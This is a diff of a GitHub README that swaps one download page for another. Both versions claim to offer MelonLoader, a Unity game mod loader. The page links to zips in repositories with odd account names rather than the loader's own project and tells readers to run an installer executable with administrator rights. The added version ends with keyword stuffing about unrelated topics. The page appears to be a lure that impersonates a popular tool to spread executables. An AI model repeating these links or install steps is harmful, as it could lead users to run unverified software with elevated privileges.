@@ -1,77 +1,66 @@
+# 🍈 melon-loader-download - Add custom mods to Unity games
 
-<img width="375" height="308" alt="image" src="https://github.com/user-attachments/assets/2c8888ab-9ab2-4df1-b6a8-e5260b0e48c1" />
+[ ![Download MelonLoader](https://img.shields.io/badge/Download-Click_Here-blue.svg) ](https://github.com/imprisonmentphonemessage673/melon-loader-download)
 
+## 📁 What is MelonLoader?
 
-#  Melon Loader Download
+MelonLoader acts as a bridge between your computer and Unity games. It lets you add new features or changes to games that do not support them natively. This system loads custom code into the game engine at startup. Use this to change gameplay, add items, or fix issues within your favorite titles.
 
-**Melon Loader Download** is a simple and convenient tool to quickly download and install **Melon Loader** — the most popular mod loader for Unity-based games such as VRChat, Gorilla Tag, Among Us, and many others.
+The software works with many game types, including Mono and IL2CPP builds. It manages scripts and plugins so you can organize your game tweaks in one place. You do not need to rewrite game files yourself, as the program handles the technical injection process for you.
 
-  <img width="400" height="100" alt="6fbf1eb6-37c2-4c15-8517-5a592a88699b" src="https://github.com/user-attachments/assets/77a2adbb-f439-4483-b15c-069dc50a120c" />
+## 💻 Requirements
 
-## Install
-[Download `melon-loader.zip`](https://github.com/melon-loaders/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
----
+Before you begin, verify your computer meets these needs:
 
+*   Operating System: Windows 10 or Windows 11.
+*   System Architecture: 64-bit version of Windows.
+*   Storage: At least 500 MB of free space for the loader and mod files.
+*   Frameworks: Microsoft .NET Framework 4.8 or newer.
+*   Permissions: You need administrator access to your computer to install files in game folders.
 
+If you lack the .NET Framework, download it from the official Microsoft website before running the installer.
 
-<img width="481" height="441" alt="11a3ab59-c8b4-49dc-8299-55ce127bf499" src="https://github.com/user-attachments/assets/b1ef114a-af71-4e58-b37c-1ab98d5fbb6b" />
+## 🚀 How to Install and Use
 
----
-## Key Features
-- Easy one-click download and installation of Melon Loader
-- Automatic detection of supported Unity games
-- Support for both IL2CPP and Mono games
-- Simple and user-friendly interface
-- Regular updates for the latest Melon Loader version
+Follow these steps to set up the loader on your system. 
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `MelonLoaderDownloader.exe` as Administrator.
-4. **Select your game** from the list.
-5. Click **Install** — the tool will download and set up Melon Loader automatically.
-6. Launch your game to start using mods.
+1.  **Visit the Download Page:** Navigate to the official link to retrieve the necessary installer files.
+    [Download MelonLoader Here](https://github.com/imprisonmentphonemessage673/melon-loader-download)
+2.  **Locate the File:** Find the downloaded zip file in your downloads folder. Right-click the folder and select "Extract All" to see the contents.
+3.  **Run the Installer:** Double-click the file named "MelonLoader.Installer.exe". The program window appears on your screen.
+4.  **Select Your Game:** Click the "Select" button inside the installer. Navigate to the game folder where your game's main executable file exists (usually named GameName.exe).
+5.  **Choose Version:** Pick the latest version from the dropdown list unless a specific mod requires an older build.
+6.  **Start Installation:** Click the "Install" button. The loader creates a local folder inside your game directory.
+7.  **Verify Setup:** After the progress bar reaches 100%, close the installer. Launch your game normally. You should see a console window appear briefly when the game starts. This confirms the loader works correctly.
 
-**Pro Tip:** Place your downloaded mods in the `Mods` folder inside the game directory.
+## ⚙️ Managing Plugins and Mods
 
----
-## System Requirements
-- **Windows 10 / 11** (64-bit)
-- Unity-based game installed
-- Administrator privileges required
-- Stable internet connection for downloading Melon Loader
+Once you install MelonLoader, you find new folders in your game directory:
 
----
-## Security & Legal
-**Important Notice:**  
-Melon Loader is intended for single-player and private use. Using mods in official online games may result in account bans.
+*   **Mods Folder:** Place your downloaded .dll files for game modifications here.
+*   **Plugins Folder:** Place .dll files that perform background tasks here.
+*   **UserData Folder:** The loader saves settings and configuration files here after the first launch.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Always back up your game files before installing.
-<img width="340" height="187" alt="image" src="https://github.com/user-attachments/assets/97843e31-ca19-42cb-b5cf-f9d4821add90" />
+To add a modification, download the mod file and copy it into the "Mods" folder. Restart the game to apply the changes. If a mod causes problems, remove the file from the folder and restart the game to return to the original state.
 
----
-## Contributing
-Contributions are welcome! Help improve the downloader, add new game support, or fix issues.
+## 🛠 Troubleshooting Common Issues
 
----
-## License & Acknowledgments
-### License
-**Melon Loader Download** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+The loader is stable, but errors happen. Use these solutions if you run into trouble.
 
-**Copyright © 2026 RuwetDituturi**
+**The game does not launch.**
+If the game crashes immediately, another mod might conflict with the game version. Remove all files from your "Mods" folder and add them back one by one to find the culprit.
 
-### Acknowledgments
-- Thanks to the original Melon Loader team.
-- The Unity modding community.
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5554617d-6232-4b6e-8b03-1e13d9127012" />
+**The console window stays open.**
+This is normal behavior during the initial boot. If it stays active after the game loads, check for a "Log" file in the "MelonLoader" folder within your game directory. This file explains errors happening during the startup process.
 
-<p align="center">
-  Developed with ❤️ for the Unity modding community
-</p>
+**The installer fails to find the game.**
+The installer looks for a specific executable file. Ensure you selected the folder containing the game's actual .exe file. If you run the game through a launcher like Steam, "Browse Local Files" in that launcher helps you find the correct path.
 
+**Compatibility Errors.**
+Always check if your game version matches the version of the mod you intend to use. Game updates often change how the engine works, which breaks older mods until developers release updates.
 
-<img width="1782" height="261" alt="c891d6f6-5242-4aac-8e1b-76bb2d048e5a" src="https://github.com/user-attachments/assets/4064578f-0ef5-4311-8aac-aaeb5f06d27d" />
+## 🛡 Security and Safety
+
+Only download mods and files from trusted sources. While MelonLoader itself is safe, external mods can change your game files or interact with your system. Keep your antivirus software active while downloading and extracting new files.
+
+Keywords: bonelab, btd6-paragon, cvr, cx-platform, cx-reports, fileexplorer, gorilla-tag, gorillatagmods, gorillatagvr, gtag, install-melonloader, melonloader, melonloader-tutorials, schedule-generator, schedule-library, schedule-management, schedule-manager, schedule1, schedulei, tld-mod
